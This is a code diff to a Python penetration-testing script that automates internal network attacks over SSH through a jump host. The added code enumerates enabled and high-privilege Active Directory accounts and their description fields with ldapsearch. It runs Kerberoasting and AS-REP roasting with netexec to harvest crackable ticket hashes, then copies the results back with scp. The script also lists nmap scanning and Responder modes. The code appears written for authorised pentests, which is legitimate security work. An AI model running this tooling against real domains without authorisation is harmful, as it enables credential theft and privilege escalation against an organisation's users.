@@ -89,13 +89,13 @@ def run_ssh_command(host, command):
     except subprocess.CalledProcessError as e:
         return (False, e.stderr)
 
-def copy_files(host, file_to):
+def copy_files(file1, file2):
     try:
         ssh_command = [
             'scp',
             '-F', str(Path.home() / '.ssh/config'),
-            file_to,
-            f'{host}:~/segtest/full_nmap.xargs'
+            file1,
+            file2
         ]
         result = subprocess.run(ssh_command, capture_output=True, text=True)
         return (True, result.stdout)
@@ -195,7 +195,7 @@ def start_nmaps(scan_file, host):
         f.write(scan_file)
 
     # transfer commands file on the remote
-    cp = copy_files(host_name, f'{host_name}-segtest/full_nmap.xargs')
+    cp = copy_files(f'{host_name}-segtest/full_nmap.xargs', f'{host_name}:~/segtest/full_nmap.xargs')
 
     try:
         xargs = f'xargs -P {host['parallel']}'
@@ -234,25 +234,43 @@ def en_users(jh, dc_ip, user, password, domain):
         else:
             dns += ',dc='+item
     
-    command1 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2"
+    command1 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > enabled_users"
 
-    command2 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(|(memberOf=CN=Domain Admins,"+dns+")(memberOf=CN=Enterprise Admins,CN=Users,"+dns+")(memberOf=CN=Schema Admins,CN=Users,"+dns+")(memberOf=CN=Administrators,CN=Builtin,"+dns+"))' sAMAccountName memberOf | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2"
+    command2 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(|(memberOf=CN=Domain Admins,"+dns+")(memberOf=CN=Enterprise Admins,CN=Users,"+dns+")(memberOf=CN=Schema Admins,CN=Users,"+dns+")(memberOf=CN=Administrators,CN=Builtin,"+dns+"))' sAMAccountName memberOf | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > high_priv_users"
+
+    command3 =  "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + """' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName description | awk 'BEGIN {FS="\\n"; RS=""; OFS=","}{user=""; desc="";for (i=1; i<=NF; i++){if ($i ~ /^sAMAccountName:/) user=substr($i, 17);if ($i ~ /^description:/) desc=substr($i, 13);}print user, desc}' > users_descriptions"""
+
+    en = run_ssh_command(jh, command1)
+    print('Enabled users gathered!')
+    en_adm = run_ssh_command(jh, command2)
+    print('High privilege users gathered!')
+    us_desc = run_ssh_command(jh, command3)
+    print('Users and their description gathered!')
+
+    # create local directory
+    create_local_dir = ['mkdir', f'enabled-users']
+    create = subprocess.run(create_local_dir, capture_output=True, text=True)
     
-    # ssh_command 
-
-    
-    print(command2)
-
+    copy_files(f'{jh}:~/enabled_users', f'enabled-users/enabled_users')
+    copy_files(f'{jh}:~/high_priv_users', f'enabled-users/high_priv_users')
+    copy_files(f'{jh}:~/users_descriptions', f'enabled-users/users_descriptions')
 
 def roasting(jh, dc_ip, user, password, domain):
-    kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} -kdcHost {dc_ip} --kerberoasting"
-    asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0]} if '@' in user else user' -p '{password}' -d {domain} -kdcHost {dc_ip} --asreproast"
+    kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --kerberoasting kerberoasted-users"
+    asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --asreproast asreproasted-users"
 
-    run_ssh_command(jh, kerb_cmd)
-    run_ssh_command(jh, asrep_cmd)
-
+    kerb = run_ssh_command(jh, kerb_cmd)
+    print('Performing kerberoasting!')
+    asrep = run_ssh_command(jh, asrep_cmd)
+    print('Performing ASREPRoasting!')
     
-
+    # create local directory
+    create_local_dir = ['mkdir', f'roasting']
+    create = subprocess.run(create_local_dir, capture_output=True, text=True)
+    
+    copy_files(f'{jh}:~/kerberoasted-users', f'roasting/kerberoasted-users')
+    copy_files(f'{jh}:~/asreproasted-users', f'roasting/asreproasted-users')
+    
 def main():
     parser = argparse.ArgumentParser(description="Run nmap scan in tmux on remote host")
     subparsers = parser.add_subparsers(dest="mode", required=True, help="Select a mode")
@@ -265,7 +283,6 @@ def main():
     
     results_parser = subparsers.add_parser("scan-results", help="Show scan results")
     results_parser.add_argument("config_file", help="Path to YAML configuration file")
-
     
     subparsers.add_parser("start-responder", help="Start responder tool")
     subparsers.add_parser("parse-scans", help="Parse scan results")
